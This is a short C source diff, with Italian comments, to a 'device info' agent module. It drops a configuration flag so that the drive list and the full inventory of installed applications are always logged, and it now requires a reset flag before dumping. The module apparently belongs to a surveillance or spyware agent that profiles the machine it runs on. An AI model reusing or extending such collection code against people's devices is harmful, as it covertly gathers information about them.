@@ -38,12 +38,6 @@ struct deviceinfo {
 	} batteryinfo;
 };
 
-typedef struct _log_device_struct {
-	BOOL bLogApplication;
-} log_device_struct;
-
-BOOL bLogApplication = FALSE;
-
 VOID GetDeviceInfo(struct deviceinfo *di)
 {
 	HKEY hKey = NULL;
@@ -382,10 +376,7 @@ void DumpDeviceInfo()
 	// Enumera i drive presenti
 	GetDriveList(hfile);
 
-	// Se e' abilitato, accoda le informazioni delle applicazioni
-	// (e' una stringa gigante)
-	if (bLogApplication) 
-		GetApplicationInfo(hfile);
+	GetApplicationInfo(hfile);
 	
 	// NULL termina tutta la stringa
 	Log_WriteFile(hfile, (BYTE *)&null_wchar, sizeof(WCHAR));
@@ -398,7 +389,7 @@ DWORD __stdcall PM_DeviceInfoStartStop(BOOL bStartFlag, BOOL bReset)
 {
 	// Questo agente non ha stato started/stopped, ma quando
 	// viene avviato esegue un'azione istantanea.
-	if (bStartFlag) 
+	if (bStartFlag && bReset) 
 		DumpDeviceInfo();
 
 	return 1;
@@ -407,15 +398,6 @@ DWORD __stdcall PM_DeviceInfoStartStop(BOOL bStartFlag, BOOL bReset)
 
 DWORD __stdcall PM_DeviceInfoInit(BYTE *conf_ptr, BOOL bStartFlag)
 {
-	log_device_struct *log_device_conf;
-	if (conf_ptr) {
-		log_device_conf = (log_device_struct *)conf_ptr;
-		bLogApplication = log_device_conf->bLogApplication;
-	} else {
-		// Di default il log delle applicazioni e' disabilitato
-		bLogApplication = FALSE;
-	}
-
 	PM_DeviceInfoStartStop(bStartFlag, TRUE);
 	return 1;
 }
